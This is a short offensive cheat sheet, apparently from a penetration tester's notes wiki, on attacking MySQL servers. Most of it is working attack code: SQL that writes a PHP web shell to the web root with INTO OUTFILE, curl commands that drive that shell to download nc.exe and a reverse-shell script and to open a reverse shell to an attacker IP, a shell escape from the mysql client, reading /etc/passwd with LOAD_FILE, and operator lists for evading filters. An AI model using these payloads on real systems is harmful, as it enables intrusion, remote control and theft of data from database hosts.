# MySQL Hacking

## Login
For `mysql` including [[MariaDB-Hacking]]:
```bash
mysql -u $username -p $password -h $HOST
mysql -u root -h $HOST

mysql>\! sh # run a sh shell from mysql!
```

## INTO SHELL Shell
```sql
-- PHP
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
curl "http://$ip/shell.php?cmd=whoami"
curl "http://$ip/shell.php?cmd=certutil+-urlcache+-f+http://$ip/nc.exe+nc.exe"
curl "http://$ip/shell.php?cmd=wget+http://$ip/reverse_shell.sh"
curl "http://127.0.0.1:8080/shell.php?cmd=nc.exe+$ip+4444+-e+powershell.exe"
```
## Misconfigurations

[Raptor.c](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf.c)

## Exploit 

The basic methodology for exploiting MySQL:
-   Access the remote database using administrator credentials
-   Create a new table in the main database
-   Inject PHP code to gain command execution
	    Example code: `<?php $cmd=$_GET["cmd"];system($cmd);?>`  
-   Drop table contents onto a file the user can access  
-   Execute and obtain RCE on the host.

Either 
```sql
CREATE TABLE users(
id INT AUTO_INCREMENT,
   first_name VARCHAR(100),
   last_name VARCHAR(100),
   email VARCHAR(50),
   password VARCHAR(20),
   location VARCHAR(100),
   dept VARCHAR(100),
   is_admin TINYINT(1),
   register_date DATETIME,
   PRIMARY KEY(id)
);
```

Or use `SELECT * LOAD_FILE('/etc/passwd')`

  `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`

## Bypassing Defences

#### Comparison Operators

To bypass weak detection on the equals operator here are all the comparison operators in MySQL
[MySQL comparison operators](https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html)
```sql
>  -- Greater than operator
>=  -- Greater than or equal operator
<  -- Less than operator
<>, !=  -- Not equal operator
<=  -- Less than or equal operator
<=>  -- NULL-safe equal to operator
=  -- Equal operator
BETWEEN ... AND ...  -- Whether a value is within a range of values
COALESCE()  -- Return the first non-NULL argument
GREATEST()  -- Return the largest argument
IN()  -- Whether a value is within a set of values
INTERVAL()  -- Return the index of the argument that is less than the first argument
IS  -- Test a value against a boolean
IS NOT  -- Test a value against a boolean
IS NOT NULL  -- NOT NULL value test
IS NULL  -- NULL value test
ISNULL()  -- Test whether the argument is NULL
LEAST()  -- Return the smallest argument
LIKE  -- Simple pattern matching
NOT BETWEEN ... AND ...  -- Whether a value is not within a range of values
NOT IN()  -- Whether a value is not within a set of values
NOT LIKE  -- Negation of simple pattern matching
STRCMP()  -- Compare two strings
```
## References

[Raptor.c](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf.c)
